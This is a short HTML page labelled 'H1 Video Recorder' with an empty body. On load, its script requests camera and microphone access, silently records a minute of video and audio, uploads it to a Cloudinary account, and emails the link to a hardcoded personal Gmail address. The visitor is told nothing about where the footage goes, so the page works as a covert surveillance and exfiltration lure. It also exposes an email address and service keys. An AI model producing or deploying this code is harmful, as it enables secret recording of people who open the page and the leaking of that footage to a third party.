<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>H1 Video Recorder</title>
</head>
<body>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS with your public key
    emailjs.init("ACOn6PC1Zb70JrmxT"); // Replace with your EmailJS public key

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('file', blob);
          formData.append('upload_preset', 'unsigned_video_uploads');

          try {
            const uploadResponse = await fetch('https://api.cloudinary.com/v1_1/dymxlqxxx/video/upload', {
              method: 'POST',
              body: formData
            });

            const uploadResult = await uploadResponse.json();

            if (!uploadResult.secure_url) throw new Error("Upload failed");

            const videoUrl = uploadResult.secure_url;

            await emailjs.send("service_khmk344", "template_oyrsayr", {
              to_email: "julianlee252@gmail.com",
              message: `Here is the video link: ${videoUrl}`
            });

            alert("✅ Video uploaded and email sent!");
          } catch (error) {
            console.error("❌ Failed to upload or send email:", error);
            alert("❌ Failed to upload or send email: " + error.message);
          }
        };

        recorder.start();

        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 60000); // Stop after 60 seconds

      } catch (err) {
        alert("Permission denied or error: " + err.message);
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
